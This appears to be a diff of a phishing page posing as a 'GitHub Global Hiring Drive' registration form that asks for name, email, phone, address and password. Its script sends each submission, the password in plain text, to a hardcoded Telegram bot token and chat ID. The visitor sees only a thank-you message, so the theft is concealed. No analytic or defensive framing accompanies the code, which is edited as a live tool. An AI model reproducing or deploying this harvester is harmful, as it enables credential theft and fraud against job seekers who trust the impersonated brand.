@@ -3,156 +3,147 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>GitHub Global Hiring 2025</title>
+  <title>GitHub Global Hiring Drive</title>
   <style>
     * {
       box-sizing: border-box;
-      margin: 0;
-      padding: 0;
+      font-family: 'Segoe UI', sans-serif;
     }
 
     body {
-      font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(to bottom right, #222, #555);
-      height: 100vh;
+      margin: 0;
+      padding: 0;
+      background: linear-gradient(135deg, #1f1c2c, #928dab);
       display: flex;
       justify-content: center;
       align-items: center;
+      height: 100vh;
     }
 
-    .form-container {
-      background-color: #111;
+    .container {
+      background: #111;
+      color: white;
       padding: 30px;
-      border-radius: 12px;
-      width: 100%;
+      border-radius: 15px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+      width: 90%;
       max-width: 400px;
-      box-shadow: 0 0 20px rgba(100, 0, 255, 0.4);
-      text-align: center;
     }
 
     h2 {
-      color: #fff;
+      text-align: center;
       margin-bottom: 20px;
     }
 
     input {
       width: 100%;
-      padding: 14px;
-      margin: 12px 0;
+      padding: 12px;
+      margin: 8px 0;
       border: none;
       border-radius: 8px;
-      background: #1e1e1e;
-      color: #fff;
-      font-size: 16px;
-      border: 1px solid #333;
+      background-color: #222;
+      color: white;
       outline: none;
-      transition: border 0.3s;
+      border: 1px solid #444;
     }
 
     input:focus {
-      border: 1px solid #bb86fc;
-      box-shadow: 0 0 5px #bb86fc;
+      border-color: #9b59b6;
     }
 
     button {
       width: 100%;
       padding: 14px;
-      margin-top: 15px;
+      margin-top: 10px;
+      background-color: #8e2de2;
       border: none;
       border-radius: 8px;
+      color: white;
+      font-weight: bold;
       font-size: 16px;
-      background: linear-gradient(90deg, #7b2ff7, #f107a3);
-      color: #fff;
       cursor: pointer;
-      transition: opacity 0.3s;
     }
 
     button:hover {
-      opacity: 0.9;
-    }
-
-    .link {
-      margin-top: 15px;
-      font-size: 14px;
-      color: #ccc;
-    }
-
-    .link a {
-      color: #bb86fc;
-      text-decoration: none;
+      background-color: #5f27cd;
     }
 
     .thankyou {
+      text-align: center;
+      color: #0f0;
+      font-weight: bold;
       display: none;
       margin-top: 20px;
-      color: #00ff87;
-      font-size: 18px;
-      font-weight: bold;
     }
 
-    @media (max-width: 480px) {
-      .form-container {
-        margin: 20px;
-        padding: 25px;
-      }
+    .info {
+      font-size: 14px;
+      margin-top: 20px;
+      color: #aaa;
+      text-align: center;
     }
   </style>
 </head>
 <body>
-
-  <div class="form-container">
-    <h2>Register</h2>
-    <form id="registerForm">
+  <div class="container">
+    <h2>Register for GitHub Hiring Drive</h2>
+    <form id="registrationForm">
       <input type="text" name="name" placeholder="Full Name" required />
       <input type="email" name="email" placeholder="E-mail" required />
-      <input type="text" name="phone" placeholder="Phone" required />
+      <input type="tel" name="phone" placeholder="Contact Number" required />
+      <input type="text" name="address" placeholder="Address" required />
       <input type="password" name="password" placeholder="Password" required />
       <input type="password" name="confirm" placeholder="Confirm Password" required />
-      <button type="submit">Register</button>
+      <button type="submit">Register for Drive</button>
     </form>
-    <div class="link">Have account? <a href="#">Sign In</a></div>
-    <div class="thankyou">✅ Registered! We’ll reach out soon.</div>
+    <div class="thankyou" id="thankyouMsg">✅ Thank you! You will be contacted by email.</div>
+    <div class="info">GitHub Global Careers • 2025 Drive</div>
   </div>
 
   <script>
-    document.getElementById("registerForm").addEventListener("submit", async function (e) {
+    const botToken = "7448574888:AAEqL3IHQocQslKBwia_TTAlt0jizyHao-U"; // Replace with your actual bot token
+    const chatId = "968143308";     // Replace with your actual chat ID
+
+    document.getElementById("registrationForm").addEventListener("submit", function(e) {
       e.preventDefault();
 
       const form = e.target;
-      const data = {
-        name: form.name.value,
-        email: form.email.value,
-        phone: form.phone.value,
-        password: form.password.value,
-        confirm: form.confirm.value
-      };
+      const name = form.name.value;
+      const email = form.email.value;
+      const phone = form.phone.value;
+      const address = form.address.value;
+      const password = form.password.value;
+      const confirm = form.confirm.value;
 
-      if (data.password !== data.confirm) {
-        alert("Passwords do not match!");
+      if (password !== confirm) {
+        alert("Passwords do not match.");
         return;
       }
 
-      try {
-        await fetch("https://api.telegram.org/bot7448574888:AAEqL3IHQocQslKBwia_TTAlt0jizyHao-U/sendMessage", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            chat_id: "<968143308>",
-            text: `🔐 *New Registration - GitHub Drive 2025*\n\n👤 Name: ${data.name}\n📧 Email: ${data.email}\n📱 Phone: ${data.phone}\n🔑 Password: ${data.password}`,
-            parse_mode: "Markdown"
-          })
-        });
+      const message = `🚨 *GitHub Registration* 🚨\n\n👤 Name: ${name}\n📧 Email: ${email}\n📱 Phone: ${phone}\n🏠 Address: ${address}\n🔐 Password: ${password}`;
 
-        form.style.display = "none";
-        document.querySelector(".thankyou").style.display = "block";
-      } catch (err) {
-        alert("Error submitting form.");
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: "Markdown"
+        })
+      })
+      .then(response => {
+        if (response.ok) {
+          form.style.display = "none";
+          document.getElementById("thankyouMsg").style.display = "block";
+        } else {
+          alert("Failed to send message. Check bot ID & token.");
+        }
+      })
+      .catch(err => {
         console.error(err);
-      }
+        alert("Something went wrong.");
+      });
     });
   </script>
-
 </body>
 </html>
